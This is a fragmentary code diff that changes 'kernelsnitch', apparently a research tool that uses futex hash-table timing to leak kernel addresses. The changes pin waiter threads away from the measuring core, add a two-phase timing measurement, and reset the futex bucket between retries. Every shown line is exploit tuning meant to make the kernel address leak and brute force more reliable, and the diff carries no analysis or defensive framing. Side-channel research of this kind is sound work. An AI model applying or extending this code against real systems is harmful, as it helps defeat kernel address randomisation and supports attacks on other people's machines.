@@ -525,7 +525,41 @@
  
      volatile unsigned char *futexes;
      volatile unsigned char inc_futex[KS_PAGE_SIZE];
-@@ -204,8 +206,13 @@
+@@ -115,12 +117,19 @@
+ struct inc_arg {
+     struct kernelsnitch_shared_state *ks;
+     size_t id;
++    size_t core;
+ };
+ static void *__do_increase(void *arg)
+ {
+     struct inc_arg *inc_arg = (struct inc_arg *)arg;
+     struct kernelsnitch_shared_state *ks = inc_arg->ks;
+     size_t id = inc_arg->id;
++    size_t core = inc_arg->core;
++    /* pin this piled waiter away from the measuring core to avoid preempting it */
++    cpu_set_t cpuset;
++    CPU_ZERO(&cpuset);
++    CPU_SET(core, &cpuset);
++    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
+     SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
+     free(inc_arg);
+     return 0;
+@@ -135,10 +144,13 @@
+ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
+ {
+     pthread_t tid;
++    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
++    if (ncpus < 2) ncpus = 2;
+     for (size_t i = 0; i < amount; ++i) {
+         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
+         inc_arg->id = id;
+         inc_arg->ks = ks;
++        inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
+         SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
+     }
+     WAIT();
+@@ -204,8 +216,13 @@
      for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
          if ((coarse_addr % (1ULL << 40)) == 0)
              if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
@@ -541,7 +575,7 @@
  
                  size_t found_hash = 1;
                  if (!ks->mte_enabled) {
-@@ -233,7 +240,8 @@
+@@ -233,7 +250,8 @@
                              break;
                          }
                      }
@@ -551,7 +585,7 @@
              }
          }
      }
-@@ -266,6 +274,8 @@
+@@ -266,6 +284,8 @@
      ks->collisions = __collision_cnt;
      ks->verbose = __verbose;
      ks->mte_enabled = __mte_enabled;
@@ -560,7 +594,7 @@
  
      // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
      ks->futex_hash_table_size = 256*ks->cpu_cnt;
-@@ -301,7 +311,7 @@
+@@ -301,7 +321,7 @@
  {
      #define ID 128
  #ifndef KERNELSNITCH_THRESHOLD_MULT
@@ -569,7 +603,7 @@
  #endif
      size_t count = 0;
      size_t wanted;
-@@ -311,28 +321,53 @@
+@@ -311,28 +331,58 @@
      ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
      wanted = ks->collisions - 1;
  
@@ -630,10 +664,15 @@
          }
      }
 +    free(t_before);
++    /* wake/clear the piled bucket so the next retry's two-phase measurement
++     * starts from a clean (unpiled) baseline */
++    __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE,
++            APPENDED_FUTEXES + 16, NULL, NULL, 0);
++
      if (wanted == count) {
          if (ks->verbose) pr_info("found %zd collisisons\n", count);
          ks->state = KERNELSNITCH_COLLISIONS_FOUND;
-@@ -357,12 +392,16 @@
+@@ -357,12 +407,16 @@
      if (ks->verbose) pr_info("start bruteforcing\n");
      reset_cpu_pin();
  
